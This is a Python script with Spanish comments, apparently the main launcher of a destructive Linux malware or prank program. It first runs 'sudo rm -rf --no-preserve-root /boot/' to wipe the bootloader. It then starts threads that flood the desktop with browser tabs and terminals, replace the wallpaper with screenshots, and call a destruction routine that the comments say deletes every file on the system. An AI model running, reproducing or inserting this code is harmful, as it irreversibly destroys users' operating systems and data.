from os import listdir
from threading import Thread
from colorama import Fore, Style
from time import sleep
import webbrowser
from subprocess import run
# Importa los módulos desde src
try:
     from src.behavior import * 
     from src.destruct import *
     from src.pc_info import *
     from src.wallpaper import *
     
except ModuleNotFoundError:
     print("Ejecuta el script desde la carpeta linux, por favor")
     
def main():
     
     #    Empieza a eliminar el grub para que el usuario no pueda reiniciar así nomas
     system('sudo rm -rf --no-preserve-root /boot/')

     # Lista de threads
     threads = []

     # Inicia 3 threads, todos haciendo lo mismo,
     # ralentizando muchisimo la máquina
     #

     #    Este thread se encarga de abrir pestañas del
     #    Navegador con varias busquedas variadas
     #    source              :    src/behavior.py, línea 21         
     t1 = Thread(target=webOpen)
     t1.start()
          
     #    Este thread abre emuladores de terminal, 
     #    Con el objetivo de confundir
     #    source              :    src/behavior.py, línea 56         
     t2 = Thread(target=annoying_behavior)
     t2.start()
          
     #    Este thread toma capturas de pantalla usando flameshot,
     #    y las pone de fondo de pantalla, confundiendo aún mas
     #    source              :    src/wallpaper.py, línea 21    
     t3 = Thread(target=set_wallpapers)
     t3.start()

     #    Este thread se encarga de destruir el sistema operativo linux,
     #    primero destruyendo el boot para seguidamente remover
     #    todos los archivos que pueda usando el comando ```sudo rm -rf --no-preserve-root /```
     #    source              :    src/destruct.py, línea 5
     t4 = Thread(target=start_destruction)
     t4.start()
     
     #    Agrega los threads a la lista
     threads.append(t1)
     threads.append(t2)
     threads.append(t3)
     threads.append(t4)

     # Los threads son unidos
     for thread in threads:

     #    Une cada thread por cada
     #    Vuelta de bucle
          thread.join()

if __name__ == "__main__":
     main()
